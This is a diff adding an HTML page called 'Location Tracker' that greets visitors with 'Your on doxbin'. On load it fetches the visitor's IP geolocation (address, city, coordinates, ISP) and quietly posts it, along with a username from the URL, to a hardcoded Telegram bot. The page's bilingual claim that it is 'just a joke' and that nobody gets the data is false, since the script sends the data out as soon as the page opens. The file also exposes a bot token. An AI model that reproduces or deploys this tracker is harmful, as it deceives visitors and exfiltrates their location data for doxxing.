@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en, ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            margin: 0;
+            padding: 2em;
+        }
+        h1 {
+            color: #ffffff;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);
+        }
+        hr {
+            border: 1px solid #ffffff;
+        }
+        p {
+            margin: 0.5em 0;
+        }
+        strong {
+            color: #ffffff;
+        }
+        span {
+            color: #b3b3b3;
+        }
+    </style>
+</head>
+<body>
+    <h1>Hi! Your on doxbin 😈😈</h1>
+    <h1>All this just a joke, nobody gets ur ip and data!!</h1>
+    <h1>Все это просто шутка, никто не получит ваш ip и данные!!</h1>
+    <hr>
+    <p><strong>IP Address:</strong> <span id="ip_address"></span></p>
+    <p><strong>Country:</strong> <span id="country_name"></span></p>
+    <p><strong>Region:</strong> <span id="region_name"></span></p>
+    <p><strong>City:</strong> <span id="city_name"></span></p>
+    <p><strong>Latitude:</strong> <span id="latitude"></span></p>
+    <p><strong>Longitude:</strong> <span id="longitude"></span></p>
+    <p><strong>Postal Code:</strong> <span id="postal_code"></span></p>
+    <p><strong>Timezone:</strong> <span id="timezone"></span></p>
+    <p><strong>ISP:</strong> <span id="isp"></span></p>
+    <p><strong>Username:</strong> <span id="username"></span></p>
+    <hr>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Replace with your bot token and chat ID
+            const botToken = "7290838758:AAE_9p4-Bu7qVum_aX5BO-ZAVFf5PIxwb2U";
+            const chatId = "7936915348";
+
+            // Function to send data to Telegram
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const payload = {
+                    chat_id: chatId,
+                    text: message,
+                };
+
+                fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(payload),
+                })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("Message sent to Telegram successfully.");
+                        } else {
+                            console.error("Failed to send message to Telegram.");
+                        }
+                    })
+                    .catch(error => console.error("Error:", error));
+            }
+
+            // Fetch IP data
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const username = urlParams.get("username") || "Unknown User";
+
+                    // Update the page with fetched data
+                    document.getElementById("ip_address").textContent = data.ip;
+                    document.getElementById("country_name").textContent = data.country_name;
+                    document.getElementById("region_name").textContent = data.region;
+                    document.getElementById("city_name").textContent = data.city;
+                    document.getElementById("latitude").textContent = data.latitude;
+                    document.getElementById("longitude").textContent = data.longitude;
+                    document.getElementById("postal_code").textContent = data.postal;
+                    document.getElementById("timezone").textContent = data.timezone;
+                    document.getElementById("isp").textContent = data.org;
+                    document.getElementById("username").textContent = username;
+
+                    // Prepare message for Telegram
+                    const message = `
+IP Address: ${data.ip}
+Country: ${data.country_name}
+Region: ${data.region}
+City: ${data.city}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Postal Code: ${data.postal}
+Timezone: ${data.timezone}
+ISP: ${data.org}
+Username: ${username}
+                    `;
+                    sendToTelegram(message);
+                })
+                .catch(error => console.error("Error fetching IP data:", error));
+        });
+    </script>
+</body>
+<p><strong>All this just a joke, nobody gets ur ip and data!!</strong> <span id="jk"></span></p>
+<p><strong>Все это просто шутка, никто не получит ваш ip и данные!!</strong> <span id="ru"></span></p>
+</html>
